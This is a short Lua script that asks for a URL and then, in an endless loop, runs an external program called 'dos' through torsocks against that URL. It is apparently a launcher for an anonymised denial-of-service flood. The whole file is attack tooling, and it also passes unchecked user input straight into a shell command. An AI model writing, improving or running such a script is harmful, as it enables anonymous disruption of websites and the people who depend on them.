io.write("enter url: ")
local url = io.read("*l")
while true
do
os.execute("torsocks ./dos " .. url .. " 1000")
end